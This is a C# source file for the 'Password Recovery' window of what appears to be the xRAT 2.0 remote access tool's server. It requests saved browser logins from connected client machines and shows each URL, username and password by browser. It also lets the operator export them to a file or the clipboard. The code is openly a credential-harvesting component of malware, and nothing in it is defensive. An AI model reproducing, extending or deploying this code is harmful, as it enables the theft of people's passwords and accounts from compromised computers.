using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using xServer.Core;
using xServer.Core.Recovery.Helper;
using xServer.Settings;

namespace xServer.Forms
{
    public partial class FrmPasswordRecovery : Form
    {
        public List<Client> ConnectedClients { get; set; }

        public FrmPasswordRecovery(List<Client> connectedClients)
        {
            
            ConnectedClients = connectedClients;
            foreach (Client client in ConnectedClients)
            {
                // Set their frmpass to this
                client.Value.FrmPass = this;
            }

            InitializeComponent();
            this.Text = string.Format("xRAT 2.0 - Password Recovery [Selected: {0}]", ConnectedClients.Count);

            txtFormat.Text = XMLSettings.SaveFormat;

            // Get passwords from clients
            SendRefresh();
        }

        #region Public Members
        public void SendRefresh()
        {
            lstPasswords.Items.Clear();
            lstPasswords.Groups.Clear();

            foreach (Client client in ConnectedClients)
            {
                // Send request packet
                new Core.Packets.ServerPackets.PasswordRequest().Execute(client);
            }
        }

        public void AddPassword(LoginInfo login, Client client)
        {
            try
            {
                ListViewGroup lvg = GetGroupFromBrowser(login.Browser);

                ListViewItem lvi = new ListViewItem() { Tag = login, Text = client.EndPoint.Address.ToString() };
                lvi.SubItems.Add(login.URL); // URL
                lvi.SubItems.Add(login.Username); // User
                lvi.SubItems.Add(login.Password); // Pass

                if (lvg == null)
                {
                    // No group exists for the browser in question

                    lvg = new ListViewGroup();
                    // Space in the browser name will not be allowed in the property
                    lvg.Name = login.Browser.Replace(" ", "");
                    lvg.Header = login.Browser;
                    lvg.Items.Add(lvi);

                    this.Invoke(new MethodInvoker(delegate
                    {
                       lstPasswords.Groups.Add(lvg);
                    }));
                }
                else
                {
                    // Group exists for the browser, lets update it with our new item appended

                    // Get the group index so we can quickly set it after we've completed operations
                    int groupIndex = lstPasswords.Groups.IndexOf(lvg);

                    lvg.Items.Add(lvi);

                    this.Invoke(new MethodInvoker(delegate
                    {
                        lstPasswords.Groups[groupIndex] = lvg;
                    }));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error on adding password: " + ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        #endregion

        #region Private Members
        private string ConvertToFormat(string format, LoginInfo login)
        {
            return format
                .Replace("BROWSER", login.Browser)
                .Replace("URL", login.URL)
                .Replace("USER", login.Username)
                .Replace("PASS", login.Password);
        }

        private StringBuilder GetLoginData(bool selected = false)
        {
            StringBuilder sb = new StringBuilder();
            string format = txtFormat.Text;

            foreach (ListViewItem lvi in (selected ? lstPasswords.SelectedItems.Cast<IEnumerable<ListViewItem>>() : lstPasswords.Items.Cast<IEnumerable<ListViewItem>>()))
            {
                sb.Append(ConvertToFormat(format, (LoginInfo)lvi.Tag));
            }
            return sb;
        }

        private void SetClipboard(string text)
        {
            try
            {
                Clipboard.SetText(text);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error while copying to your clipboard: " + ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void txtFormat_TextChanged(object sender, EventArgs e)
        {
            XMLSettings.WriteValue("SaveFormat", txtFormat.Text);
        }
        #endregion

        #region Group Methods
        public ListViewGroup GetGroupFromBrowser(string browser)
        {
            ListViewGroup lvg = null;
            this.Invoke(new MethodInvoker(delegate {
                foreach (ListViewGroup group in lstPasswords.Groups)
                {
                    // Check to see if the current group header is for our browser
                    if (group.Header == browser)
                        lvg = group;
                }
            }));
            return lvg;
        }
        
        #endregion

        #region Menu

        #region Saving

        #region File Saving
        private void allToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StringBuilder sb = GetLoginData();
            if (sfdPasswords.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                File.WriteAllText(sfdPasswords.FileName, sb.ToString());
            }
        }

        private void selectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StringBuilder sb = GetLoginData(true);
            if (sfdPasswords.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                File.WriteAllText(sfdPasswords.FileName, sb.ToString());
            }
        }
        #endregion
        #region Clipboard Copying
        private void allToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            StringBuilder sb = GetLoginData();

            SetClipboard(sb.ToString());
        }

        private void selectedToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            StringBuilder sb = GetLoginData(true);

            SetClipboard(sb.ToString());
        }
        #endregion

        #endregion

        #region Misc

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendRefresh();
        }

        private void allToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            lstPasswords.Items.Clear();
            lstPasswords.Groups.Clear();
        }

        private void selectedToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < lstPasswords.SelectedItems.Count; i++)
            {
                lstPasswords.Items.Remove(lstPasswords.SelectedItems[i]);
            }
        }

        #endregion

        #endregion
    }
}
